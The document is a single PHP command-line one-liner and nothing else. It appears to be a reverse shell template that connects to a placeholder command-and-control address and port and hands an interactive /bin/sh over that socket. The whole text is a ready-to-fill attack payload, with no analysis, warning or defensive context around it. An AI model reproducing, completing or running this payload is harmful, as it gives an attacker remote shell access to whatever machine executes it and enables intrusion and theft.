php -r '$sock=fsockopen("XX_CC_SERVER_IP",XX_PORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");'